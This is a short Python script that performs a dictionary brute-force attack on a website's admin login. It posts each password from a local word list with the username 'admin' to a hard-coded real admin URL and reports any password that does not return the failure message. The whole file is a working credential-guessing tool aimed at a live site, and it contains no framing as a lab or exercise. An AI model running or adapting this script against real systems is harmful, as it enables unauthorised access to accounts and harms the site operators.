#!/usr/bin/python3
import requests

USERNAME = 'admin'
FAILED_TEXT = 'Password no fonts!'

URL = 'https://itproger.com/admin/'

def read_passwords(input_file):
    with open(input_file) as f:
        return f.readlines()

def try_login(username, password):
    payload = {'username': username, 'password': password.strip()}
    r = requests.post(URL, data=payload)
    if not FAILED_TEXT.lower() in r.text.lower():
        return True
    return False

passwords = list(set(read_passwords('passwords.txt')))

for i, password in enumerate(passwords, start=1):
    percentage = round(float(i)/float(len(passwords))*100, 2)
    print(f'[INFO] Trying password {percentage}% ({i}/{len(passwords)})')
    if try_login(USERNAME, password):
        print(f'[SUCCESS] Password successfully cracked: {password}')
        break
else:
        print('[FAILED] Could not find password in the dictionary')